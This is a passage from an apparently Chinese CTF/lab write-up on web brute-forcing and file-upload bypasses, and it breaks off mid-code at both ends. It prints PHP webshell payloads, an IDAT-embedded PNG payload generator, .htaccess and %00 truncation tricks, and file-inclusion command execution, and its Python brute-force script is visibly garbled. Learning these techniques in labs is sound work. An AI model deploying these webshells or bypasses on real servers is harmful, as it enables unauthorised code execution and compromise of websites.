src="https://image.3001.net/images/20201025/16035979507409.png" alt="img"></a></p><h2 id="Web爆破靶场实战"><a href="#Web爆破靶场实战" class="headerlink" title="Web爆破靶场实战"></a>Web爆破靶场实战</h2><h3 id="1-简单的四位数字密码爆破"><a href="#1-简单的四位数字密码爆破" class="headerlink" title="1.简单的四位数字密码爆破"></a>1.简单的四位数字密码爆破</h3><p>用 BP 抓包发测试 <strong>Intruder</strong> 进行爆破，注意要<strong>设置密码格式</strong></p><h3 id="2-简单的弱口令密码爆破"><a href="#2-简单的弱口令密码爆破" class="headerlink" title="2.简单的弱口令密码爆破"></a>2.简单的弱口令密码爆破</h3><ul><li><strong>验证码复用</strong>漏洞<br>用 BP 抓包  输入字典进行爆破</li></ul><h3 id="3-带验证码的密码爆破？"><a href="#3-带验证码的密码爆破？" class="headerlink" title="3.带验证码的密码爆破？"></a>3.带验证码的密码爆破？</h3><p>抓包之后 <strong>不放包</strong> 验证码不会失效 就能一直爆破了</p><h3 id="4-Basic-爆破"><a href="#4-Basic-爆破" class="headerlink" title="4.Basic 爆破"></a>4.Basic 爆破</h3><p>将密码加密 base64 加密<br>BP <strong>迭代器</strong>，账号:密码  有效载荷选项 和 有效负荷处理</p><h3 id="5-前端加密爆破"><a href="#5-前端加密爆破" class="headerlink" title="5.前端加密爆破"></a>5.前端加密爆破</h3><ul><li>原理：把前端加密 md5 放进数据库<br>BP 有效负荷处理 添加HASH 的md5 加密 然后再攻击</li></ul><h3 id="6-泄露数据库撞库"><a href="#6-泄露数据库撞库" class="headerlink" title="6.泄露数据库撞库"></a>6.泄露数据库撞库</h3><ul><li>BP使用<br><strong>音叉攻击 Pichfork</strong>：是用户名与密码一一对应的进行爆破</li></ul><h3 id="7-泄露数据库撞库-2"><a href="#7-泄露数据库撞库-2" class="headerlink" title="7.泄露数据库撞库-2"></a>7.泄露数据库撞库-2</h3><ul><li>BP使用<br><strong>音叉攻击 Pichfork，paylode处理hash md5加密</strong></li></ul><h3 id="8-返回包提取爆破"><a href="#8-返回包提取爆破" class="headerlink" title="8.返回包提取爆破"></a>8.返回包提取爆破</h3><p>正确错误<strong>返回密码长度都相同</strong>时， 在Options中选择<strong>Extract</strong> ，添加返回<strong>选中</strong></p><h3 id="9-简单的-token-验证"><a href="#9-简单的-token-验证" class="headerlink" title="9.简单的 token 验证"></a>9.简单的 token 验证</h3><ul><li>token 时间戳形式<br>时间戳 BP 不能写时间戳 需要手动写脚本<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import requests</span><br><span class="line">def md5(str):</span><br><span class="line">    m=hashlib.md5()</span><br><span class="line">    m.update(str.encode(&quot;utf8&quot;))</span><br><span class="line">    return m.hexdigest()</span><br><span class="line">def main():</span><br><span class="line">    url =&quot;http://10.20.24.244/&quot; headers =</span><br><span class="line">    headers=&#123;</span><br><span class="line">        &#x27;Host&#x27;:&#x27;10.20.24.244&#x27;,</span><br><span class="line">        &#x27;Content-Type1: &#x27;application/x-ww-form-urlencoded&#x27;,</span><br><span class="line">        &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0;Win64;x64)AppleWebKit/537.36 (KHTML,like</span><br><span class="line">&#125;</span><br><span class="line">payloads=open(&quot;pass,txt&quot;).read().split(&quot;\n&quot;)</span><br><span class="line">for payload in payloads:</span><br><span class="line">    data =f&quot;username=admin&amp;password=&#123;payload&amp;token=&#123;md5(str(int(time.tihe())))y&quot; </span><br><span class="line">    r = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">    if&#x27;flag&#123;&#x27;in r.text:</span><br><span class="line">        print(f&quot;\033[32;1m[+] success &#123;data&#125;\033[0m&quot;)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;\033[1;34m[*] attack&#123;data&#125;\033[0m&quot;)</span><br></pre></td></tr></table></figure></li></ul><h3 id="10-没有简单的弱口令"><a href="#10-没有简单的弱口令" class="headerlink" title="10.没有简单的弱口令"></a>10.没有简单的弱口令</h3><p>验证码只能用一次   验证码爆破 </p><ul><li>利用burp的插件来进行验证码识别爆破</li><li>用captcha-killer插件，开源地址:<a href="https://github.com/cOny1/captcha-killer">https://github.com/cOny1/captcha-killer</a></li><li>工具 ：pkavhttpfuzzer  爱盘BP 1.7  captcha</li></ul><ol><li>将测试包粘贴到工具中 添加字典 </li><li>添加验证码标记 写入验证码地址</li><li>验证码识别重放模式：单线程</li></ol><hr><h1 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h1><p><a href="https://image.3001.net/images/20201025/16035981315620.png"><img src="https://image.3001.net/images/20201025/16035981315620.png" alt="img"></a></p><p>如何判断是否是前端验证呢？首先抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了：</p><p><a href="https://image.3001.net/images/20201025/16036095176123.png"><img src="https://image.3001.net/images/20201025/16036095176123.png" alt="img"></a></p><h2 id="解法一：抓包"><a href="#解法一：抓包" class="headerlink" title="解法一：抓包"></a>解法一：抓包</h2><p>因为是前段验证的问题，可以直接将 shell.php 重命名为 shell.png 上传抓包的时候再将文件名修改为 shell.php 即可绕过前段限制，成功上传 webshell。</p><h2 id="解法二：禁用-JS"><a href="#解法二：禁用-JS" class="headerlink" title="解法二：禁用 JS"></a>解法二：禁用 JS</h2><p>因为 JS 来校验文件后缀的原因，所以可以直接在浏览器上禁用 JS 这样就可以直接上传文件了。Chrome 内核的浏览器在审查元素的状态下可以找到 Settings 选项，然后找到 「Debugger」 选项下面直接勾选 「Disable JavaScript」即可。</p><h2 id="解法三：调试-JS"><a href="#解法三：调试-JS" class="headerlink" title="解法三：调试 JS"></a>解法三：调试 JS</h2><p>这种解法就类似于孔乙己中的茴香豆的 「茴」有几种写法？，纯粹就是为了炫技，但是并不实用，那么国光下面就简单说下调试 JS 的过程吧。</p><p>首先审查元素下下断点：</p><p><a href="https://image.3001.net/images/20201025/16036082412704.png"><img src="https://image.3001.net/images/20201025/16036082412704.png" alt="img"></a></p><p>单行单步调试，找到 <code>whitelist</code> 变量，双击元素然后直接修改数组元素的值 ：</p><p><a href="https://image.3001.net/images/20201025/16036087605888.png"><img src="https://image.3001.net/images/20201025/16036087605888.png" alt="img"></a></p><p>放掉数据包，之前的 shell.php 可直接上传成功：</p><p><a href="https://image.3001.net/images/20201025/1603608623108.png"><img src="https://image.3001.net/images/20201025/1603608623108.png" alt="img"></a></p><p>成功拿到根目录下的 flag：</p><p><a href="https://image.3001.net/images/20201025/16036086662827.png"><img src="https://image.3001.net/images/20201025/16036086662827.png" alt="img"></a></p><h1 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h1><p>这样下去感觉上课都不需要 PPT 了，关键姿势点都直接贴在了题目中了：</p><p><a href="https://image.3001.net/images/20201025/16036091167949.png"><img src="https://image.3001.net/images/20201025/16036091167949.png" alt="img"></a></p><p>因为提示了 MIME 类型校验，所以抓取上传的数据包然后直接修改 <code>Content-Type</code> 类型为：<code>image/png</code> 等合法的类型即可：</p><p><a href="https://image.3001.net/images/20201026/1603684549564.png"><img src="https://image.3001.net/images/20201026/1603684549564.png" alt="img"></a></p><h1 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h1><p>本题配图中里面包含了 GIF89a 已经很明显了，答案就在题目中：</p><p><a href="https://image.3001.net/images/20201025/16036097871368.png"><img src="https://image.3001.net/images/20201025/16036097871368.png" alt="img"></a></p><p>本题校验了图片的文件头也就是校验图片内容的，这个时候使用一个标准的图马是可以成功绕过的，由于国光的这个代码只校验了前面几个字节，所以直接写 GIF89a 即可成功绕过：</p><p><a href="https://image.3001.net/images/20201026/16036846031002.png"><img src="https://image.3001.net/images/20201026/16036846031002.png" alt="img"></a></p><h1 id="缺陷的代码-1"><a href="#缺陷的代码-1" class="headerlink" title="缺陷的代码 - 1"></a>缺陷的代码 - 1</h1><p>本题的图片上的第 2 行代码是一个有缺陷的代码，黑名单关键词替换为空的操作是一种不安全的写法：</p><p><a href="https://image.3001.net/images/20201025/16036102265581.png"><img src="https://image.3001.net/images/20201025/16036102265581.png" alt="img"></a></p><p>因为代码开发者的错误写法，这种情况下可以直接使用嵌套后缀绕过：</p><p><a href="https://image.3001.net/images/20201026/16036846312806.png"><img src="https://image.3001.net/images/20201026/16036846312806.png" alt="img"></a></p><h1 id="缺陷的代码-2"><a href="#缺陷的代码-2" class="headerlink" title="缺陷的代码 - 2"></a>缺陷的代码 - 2</h1><p>本地属于理论上漏洞，因为题目环境是 Docker 容器运行的 Linux 系统，所以本题国光修改成了 Windows 的特性</p><p><a href="https://image.3001.net/images/20201025/1603610505374.png"><img src="https://image.3001.net/images/20201025/1603610505374.png" alt="img"></a></p><p>同理图片提示中的第 2 行代码也是有缺陷的，可以仅用了 <code>str_replace</code> 替换，这样很容易就被大小写绕过，因为 Windows 环境下不区分大小写，所以就可以让 .PHp 当做 .php 来解析了，但是 Linux 下这种大小写如果的话完全没作用，所以本题是国光自己造的漏洞，用来伪造 Windows 环境下的大小写不区分的情况：</p><p><a href="https://image.3001.net/images/20201026/1603684654836.png"><img src="https://image.3001.net/images/20201026/1603684654836.png" alt="img"></a></p><h1 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h1><p>本题同样题目的配图中暗示已经比较明显了，默认情况下 Apache 把 phtml、pht、php、php3、php4、php5 解析为 PHP：</p><p><a href="https://image.3001.net/images/20201025/16036116763150.png"><img src="https://image.3001.net/images/20201025/16036116763150.png" alt="img"></a></p><p>那么这里 Fuzz 一下，发现这些稍微冷门的后缀都可以直接绕过：</p><p><a href="https://image.3001.net/images/20201026/16036846759511.png"><img src="https://image.3001.net/images/20201026/16036846759511.png" alt="img"></a></p><h1 id="解析规则"><a href="#解析规则" class="headerlink" title="解析规则"></a>解析规则</h1><p>本题的暗示也已经很明显了，只要选手查询 htaccess 怎么解析的话，就可以很顺利的解题：</p><p><a href="https://image.3001.net/images/20201025/160361194314.png"><img src="https://image.3001.net/images/20201025/160361194314.png" alt="img"></a></p><p>因为题目是考擦 htaccess 这个上传知识点，所以先准备一个解析规则：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH$ cat .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure><p>然后先上传这个 .htaccess 文件到服务器的 upload 目录下：</p><p><a href="https://image.3001.net/images/20201026/16036846984498.png"><img src="https://image.3001.net/images/20201026/16036846984498.png" alt="img"></a></p><p>这表示将 upload 目录下的所有 png 图片都当做 php 来解析，然后再上传一个 shell.png 即可：</p><p><a href="https://image.3001.net/images/20201026/16036847615642.png"><img src="https://image.3001.net/images/20201026/16036847615642.png" alt="img"></a></p><p>此时这个 shell.png 就已经被当做 PHP 解析了：</p><p><a href="https://image.3001.net/images/20201025/16036122801854.png"><img src="https://image.3001.net/images/20201025/16036122801854.png" alt="img"></a></p><h1 id="古老的漏洞-1"><a href="#古老的漏洞-1" class="headerlink" title="古老的漏洞 - 1"></a>古老的漏洞 - 1</h1><p>本题依然在题目中科普了 00 截断是啥，以及 00 截断的利用条件：</p><p><a href="https://image.3001.net/images/20201025/16036124585228.png"><img src="https://image.3001.net/images/20201025/16036124585228.png" alt="img"></a></p><p>00 截断多配合路径来截断，我们来抓包看看应该是存在路径信息的，然后直接在路径后面使用 %00 来截断一下就可以成功绕过，为啥 %00 直接就可以绕过了呢？这是因为路径信息是从 GET 方式传递个后端的，这样默认会进行一次 URL 解码，%00 解码后就是空字节：</p><p><a href="https://image.3001.net/images/20201026/16036847876825.png"><img src="https://image.3001.net/images/20201026/16036847876825.png" alt="img"></a></p><p>这样保存的文件名就是这样的效果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH</span><br><span class="line">/usr/local/apache2/htdocs/upload/new.php%00shell.png</span><br></pre></td></tr></table></figure><p>因为 <code>%00</code> 起到截断的作用，所以最终会在 upload 目录下面生成 new.php 的 webshell</p><p><a href="https://image.3001.net/images/20201025/16036127173608.png"><img src="https://image.3001.net/images/20201025/16036127173608.png" alt="img"></a></p><h1 id="古老的漏洞-2"><a href="#古老的漏洞-2" class="headerlink" title="古老的漏洞 - 2"></a>古老的漏洞 - 2</h1><p>国光这一题偷懒了，没有换题目外观，不过选手们抓包就会发现这是一个 POST 型的 00 截断：</p><p><a href="https://image.3001.net/images/20201025/16036129575787.png"><img src="https://image.3001.net/images/20201025/16036129575787.png" alt="img"></a></p><p>既然是 POST 型 00 截断那么就直接抓包吧，需要在 BP 里面写一个 %00 然后再 URL 手动解码一下：</p><p><a href="https://image.3001.net/images/20201025/16036131049530.png"><img src="https://image.3001.net/images/20201025/16036131049530.png" alt="img"></a></p><h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>本题是一个条件竞争漏洞，也在题目中给了关键的功能代码贴图，以及给了解题思路了：</p><p><a href="https://image.3001.net/images/20201025/16036135842482.png"><img src="https://image.3001.net/images/20201025/16036135842482.png" alt="img"></a></p><p>条件竞争的话稍微和正常的上传姿势不一样，先把题目中给的 webshell 信息复制出来备用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php fputs(fopen(&#x27;xiao.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>然后先上传 shell.php 文件：</p><p><a href="https://image.3001.net/images/20201026/16036848394730.png"><img src="https://image.3001.net/images/20201026/16036848394730.png" alt="img"></a></p><p>BP 抓取这个数据包然后发送到 Intruder 测试器中使用 NULL 空值无限爆破：</p><p><a href="https://image.3001.net/images/20201025/16036138407749.png"><img src="https://image.3001.net/images/20201025/16036138407749.png" alt="img"></a></p><p>然后抓取访问 shell.php 的数据包：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTPGET /upload/shell.php HTTP/1.1</span><br><span class="line">Host: vul.xps.com:30009</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p>依然使用 NULL 空值爆破：</p><p><a href="https://image.3001.net/images/20201025/16036140058678.png"><img src="https://image.3001.net/images/20201025/16036140058678.png" alt="img"></a></p><p>最后成功在服务器的 upload 目录下生成 xiao.php 里的内容就是一个标准的 webshell：</p><p><a href="https://image.3001.net/images/20201025/16036153403524.png"><img src="https://image.3001.net/images/20201025/16036153403524.png" alt="img"></a></p><h1 id="move-uploaded-file-缺陷"><a href="#move-uploaded-file-缺陷" class="headerlink" title="move_uploaded_file 缺陷"></a>move_uploaded_file 缺陷</h1><p>这一题取材于 upload-labs 后面新增的题目：</p><p><a href="https://image.3001.net/images/20201025/1603615449643.png"><img src="https://image.3001.net/images/20201025/1603615449643.png" alt="img"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">move_uploaded_file($temp_file, $img_path)</span><br></pre></td></tr></table></figure><p>当 <code>$img_path</code> 可控的时候，还会忽略掉 <code>$img_path</code> 后面的 <code>/.</code> ，这一点发现最早是 <a href="https://www.smi1e.top/">Smile</a> 师傅于 2019 年 2 月份提出来的，TQL !!! 既然知道 move_uploaded_file 的这个小缺陷的话，这样既可直接 Getshell：</p><p><a href="https://image.3001.net/images/20201025/16036161031022.png"><img src="https://image.3001.net/images/20201025/16036161031022.png" alt="img"></a></p><h1 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h1><p><code>imagecreatefrom</code> 系列渲染图片都可能被绕过，有些特殊的图马是可以逃避过渲染的，另外这一题我特意还给了查看提示的按钮：</p><p><a href="https://image.3001.net/images/20201025/1603616269318.png"><img src="https://image.3001.net/images/20201025/1603616269318.png" alt="img"></a></p><p>点击这个查看提示会出现如下页面：</p><p><a href="https://image.3001.net/images/20201025/16036164852192.png"><img src="https://image.3001.net/images/20201025/16036164852192.png" alt="img"></a></p><p>注意 URL 发生了变化，没错这里是一个文件包含漏洞，这样包含选手们逃避渲染上传后的图片的话就可以直接 getshell 了：</p><p><a href="https://image.3001.net/images/20201025/16036165628118.png"><img src="https://image.3001.net/images/20201025/16036165628118.png" alt="img"></a></p><p>接下来要总结一下二次渲染的细节了，这也是耗费时间写本文的主要动力之一，因为上面的那些知识点都比较常规，这个二次渲染的细节国光我一直都没有深入总结过，正好就放这里总结一下。</p><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p>渲染前后的两张 GIF，没有发生变化的数据库部分直接插入 Webshell 即可</p><p>首先准备一张迷你的 GIF</p><p><a href="https://image.3001.net/images/20201025/16036176592096.gif"><img src="https://image.3001.net/images/20201025/16036176592096.gif" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036252666623.gif"><img src="https://image.3001.net/images/20201025/16036252666623.gif" alt="img"></a></p><p>使用 010Editor 打开这两个文件，在 「Tools」选项下面找到「Compare Files」即可对比两个文件内容：</p><p><a href="https://image.3001.net/images/20201025/1603625929446.png"><img src="https://image.3001.net/images/20201025/1603625929446.png" alt="img"></a></p><p>对比的效果如下，其中灰的部分就是内容一致的部分：</p><p><a href="https://image.3001.net/images/20201025/16036266297353.png"><img src="https://image.3001.net/images/20201025/16036266297353.png" alt="img"></a></p><p>那么只需要将 PHP 代码插入到灰色的部分即可：</p><p><a href="https://image.3001.net/images/20201025/16036267273505.png"><img src="https://image.3001.net/images/20201025/16036267273505.png" alt="img"></a></p><p>修改后的 gif 图片如下：</p><p><a href="https://image.3001.net/images/20201025/16036267469060.gif"><img src="https://image.3001.net/images/20201025/16036267469060.gif" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036268187614.gif"><img src="https://image.3001.net/images/20201025/16036268187614.gif" alt="img"></a></p><p>此时查看一下发现我们的 payload 内容依然存在：</p><p><a href="https://image.3001.net/images/20201026/16036850183974.png"><img src="https://image.3001.net/images/20201026/16036850183974.png" alt="img"></a></p><h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><p>PNG 没有 GIF 那么简单，需要将数据写入到 PLTE 数据块 或者 IDAT 数据块。首先准备一个 PNG 图片：</p><p><a href="https://image.3001.net/images/20201025/16036276956867.png"><img src="https://image.3001.net/images/20201025/16036276956867.png" alt="img"></a></p><p>两次渲染后对比一下，发现除了 PNG 文件头，其他部分全都不一致：</p><p><a href="https://image.3001.net/images/20201025/16036285349399.png"><img src="https://image.3001.net/images/20201025/16036285349399.png" alt="img"></a></p><p>看来使用 GIF 那种思路是行不通的了。PNG 的解决方法继续往下面看。</p><h3 id="写入-PLTE-数据块"><a href="#写入-PLTE-数据块" class="headerlink" title="写入 PLTE 数据块"></a>写入 PLTE 数据块</h3><p>关于实现细节以前乌云知识库的一篇文章写的很详细，感兴趣的朋友可以阅读看看：</p><p><a href="https://wooyun.x10sec.org/static/drops/tips-16034.html">WooYun 乌云 - php imagecreatefrom* 系列函数之 png</a></p><p>写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，实验证明只有索引图像才可以成功插入 payload，灰度和真彩色图像均以失败告终。</p><p>修改索引图像插入 PHP 代码的脚本项目地址为：<a href="https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py">Github - poc_png.py</a></p><p>因为值有索引图像的 PNG 才可能插入 PLTE 数据块，但是我们上面准备的 PNG 并不符合要求，得需要在 PS 里面将图片模式修改为索引颜色：</p><p><a href="https://image.3001.net/images/20201025/16036303454787.png"><img src="https://image.3001.net/images/20201025/16036303454787.png" alt="img"></a></p><p>修改的索引图片如下：</p><p><a href="https://image.3001.net/images/20201025/16036304687175.png"><img src="https://image.3001.net/images/20201025/16036304687175.png" alt="img"></a></p><p>然后使用 Python2 运行脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH</span><br><span class="line">python poc_png.py -p &#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27; -o gg_shell.png old.png</span><br></pre></td></tr></table></figure><p>生成新的 gg_shell.png 图片如下：</p><p><a href="https://image.3001.net/images/20201025/1603630522797.png"><img src="https://image.3001.net/images/20201025/1603630522797.png" alt="img"></a></p><p>这个图片是带 payload 的：</p><p><a href="https://image.3001.net/images/20201025/16036306183035.png"><img src="https://image.3001.net/images/20201025/16036306183035.png" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036307974999.png"><img src="https://image.3001.net/images/20201025/16036307974999.png" alt="img"></a></p><p>来检测一下我们的 payload 是否还存在了：</p><p><a href="https://image.3001.net/images/20201025/16036344921925.png"><img src="https://image.3001.net/images/20201025/16036344921925.png" alt="img"></a></p><p>哎貌似不对劲：</p><p><a href="https://image.3001.net/images/20201025/16036345974560.png"><img src="https://image.3001.net/images/20201025/16036345974560.png" alt="img"></a></p><p>这个字符串被渲染后貌似是顺序有点奇怪。这里国光踩了很多坑，查了很多资料网上都没有好的解决方案，最后国光<strong>将这个被目标网站渲染后的图片再上传渲染</strong>，下面是渲染后的图片：</p><p><a href="https://image.3001.net/images/20201025/16036348898441.png"><img src="https://image.3001.net/images/20201025/16036348898441.png" alt="img"></a></p><p>赶紧来查看一下里面是否包含图马信息：</p><p><a href="https://image.3001.net/images/20201025/16036348742287.png"><img src="https://image.3001.net/images/20201025/16036348742287.png" alt="img"></a></p><p>阿这！居然成功了，真的是功夫不负有心人呐，不枉国光我周末大半夜的在公司加班写的这篇文章了！！！泪目</p><h3 id="写入-IDAT-数据块"><a href="#写入-IDAT-数据块" class="headerlink" title="写入 IDAT 数据块"></a>写入 IDAT 数据块</h3><p>PNG 也是可以写入 IDAT 数据来绕过渲染的，由于快 23.00 了国光没有多余的时间研究里面细节了，这里直接引用了先知里面提供的一个脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+1];</span><br><span class="line">   $b = $p[$y+2];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#x27;./shell.png&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>直接运行生成会在脚本目录下生成 shell.png 图片，下面是生成好的 图片：</p><p><a href="https://image.3001.net/images/20201025/16036353722974.png"><img src="https://image.3001.net/images/20201025/16036353722974.png" alt="img"></a></p><p>其内容如下：</p><p><a href="https://image.3001.net/images/20201025/16036354976650.png"><img src="https://image.3001.net/images/20201025/16036354976650.png" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036356271476.png"><img src="https://image.3001.net/images/20201025/16036356271476.png" alt="img"></a></p><p>查看一下里面的 payload 是否还存在：</p><p><a href="https://image.3001.net/images/20201025/16036357015967.png"><img src="https://image.3001.net/images/20201025/16036357015967.png" alt="img"></a></p><p>依然存在的，成功绕过渲染 ，这里顺便提一下这个 shell 的使用方法，下面就不再补充了。</p><p>首先获取图片的上传地址为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CODE</span><br><span class="line">http://vul.xps.com:30010/upload/357481464.png</span><br></pre></td></tr></table></figure><p><a href="https://image.3001.net/images/20201025/1603635794598.png"><img src="https://image.3001.net/images/20201025/1603635794598.png" alt="img"></a></p><p>利用网站本身的文件包含漏洞，尝试直接包含这个图马 ：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH</span><br><span class="line">http://vul.xps.com:30010/?file=./upload/357481464.png</span><br></pre></td></tr></table></figure><p><a href="https://image.3001.net/images/20201025/16036358617110.png"><img src="https://image.3001.net/images/20201025/16036358617110.png" alt="img"></a></p><p>貌似成功了，执行命令看看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CODE</span><br><span class="line">http://vul.xps.com:30010/?0=system&amp;file=./upload/357481464.png</span><br></pre></td></tr></table></figure><p>POST 内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH</span><br><span class="line">1=cat /f14a4a4a4a444g</span><br></pre></td></tr></table></figure><p><a href="https://image.3001.net/images/20201025/16036360607524.png"><img src="https://image.3001.net/images/20201025/16036360607524.png" alt="img"></a></p><h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><p>JPG 也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试。</p><p>这个脚本 Github 搜索一下很多项目都有这个脚本，这里国光就随便搜索拿了搜索结果第一个的项目放在本文中。</p><p><strong>项目地址</strong>：<a href="https://github.com/BlackFan/jpg_payload">Github - lackFan&#x2F;jpg_payload</a></p><p>准备一个 jpg 图片：</p><p><a href="https://image.3001.net/images/20201026/16036693924901.jpg"><img src="https://image.3001.net/images/20201026/16036693924901.jpg" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201026/1603669426842.jpg"><img src="https://image.3001.net/images/20201026/1603669426842.jpg" alt="img"></a></p><p>接着使用脚本来插入 payload，如果想要修改默认 payload 的话，自行修改脚本中的下部分代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">$miniPayload = &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p>然后运行脚本插入 payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH$ php jpg_payload.php 122728342.jpg</span><br><span class="line">Success!</span><br></pre></td></tr></table></figure><p>生成的新图片为：</p><p><a href="https://image.3001.net/images/20201026/16036747206733.jpg"><img src="https://image.3001.net/images/20201026/16036747206733.jpg" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201026/1603674733221.jpg"><img src="https://image.3001.net/images/20201026/1603674733221.jpg" alt="img"></a></p><p>那么来查看一下最终这个 JPG 里面是否带有 payload 信息：</p><p><a href="https://image.3001.net/images/20201026/16036748931486.png"><img src="https://image.3001.net/images/20201026/16036748931486.png" alt="img"></a></p><p>无疑写 phpinfo () 是很容易成功的，但是 phpinfo () 并无实质性危害，我们需要插入真正的 webshell 才可以：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">$miniPayload = &#x27;&lt;?php $_GET[0]($_POST[1]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p>这里非常玄学，在国光经历了不知道多少次失败后，才成功将上面的 payload 完整插入</p></blockquote><p><a href="https://image.3001.net/images/20201026/1603675937154.jpg"><img src="https://image.3001.net/images/20201026/1603675937154.jpg" alt="img"></a></p><p>这个图马被 imagecreatefromjpeg 渲染后如下：</p><p><a href="https://image.3001.net/images/20201026/16036760334176.jpg"><img src="https://image.3001.net/images/20201026/16036760334176.jpg" alt="img"></a></p><p>查看一下 payload 是否存在：</p><p><a href="https://image.3001.net/images/20201026/16036761717904.png"><img src="https://image.3001.net/images/20201026/16036761717904.png" alt="img"></a></p><p>完美，尝试直接文件包含来执行攻击语句试试看：</p><p><a href="https://image.3001.net/images/20201026/16036764145479.png"><img src="https://image.3001.net/images/20201026/16036764145479.png" alt="img"></a></p><p><strong>JPG 坑点总结</strong></p><ol><li>需要被 imagecreatefromjpeg 渲染或再用工具</li><li>图片找的稍微大一点 成功率更高</li><li>Payload 语句越短成功率越高</li><li>一张图片不行就换一张 不要死磕</li><li>国光补充：貌似白色的图片成功率也比较高</li><li><code>&lt;?php $_GET[0]($_POST[1]);?&gt;</code> 这种 payload 成功率很高</li></ol><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>代码审计这一题如果可以动态调试的话，那么理解起来就会比较简单：</p><p><a href="https://image.3001.net/images/20201026/16036775446476.png"><img src="https://image.3001.net/images/20201026/16036775446476.png" alt="img"></a></p><p>这个题目是直接 copy Upload-labs 里面的最后一关，这个貌似还是后面新增的题目，下面是核心代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP$is_upload = false;</span><br><span class="line">$msg = 